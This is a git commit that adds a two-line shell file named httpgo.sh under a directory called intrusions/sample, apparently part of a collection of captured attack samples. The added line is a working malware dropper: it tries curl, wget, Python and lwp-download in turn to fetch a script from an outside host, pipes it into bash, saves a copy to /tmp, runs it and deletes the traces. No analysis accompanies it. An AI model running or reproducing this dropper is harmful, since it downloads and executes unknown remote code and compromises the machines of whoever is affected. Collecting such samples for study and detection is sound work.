754f47b040a3b111b60dcacb9056895a58cdc0f8
c4bbage <c4bbage@users.noreply.github.com>
2021-06-28 19:40:16 +0800

    Create httpgo.sh

---
+++ intrusions/sample/httpgo.sh
@@ -0,0 +1,2 @@
+(curl -fsSL http://bash.givemexyz.in/xms||wget -q -O- http://bash.givemexyz.in/xms||python -c 'import urllib2 as fbi;print fbi.urlopen("http://bash.givemexyz.in/xms").read()')| bash -sh; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; /tmp/xms; rm -rf /tmp/xms
+##
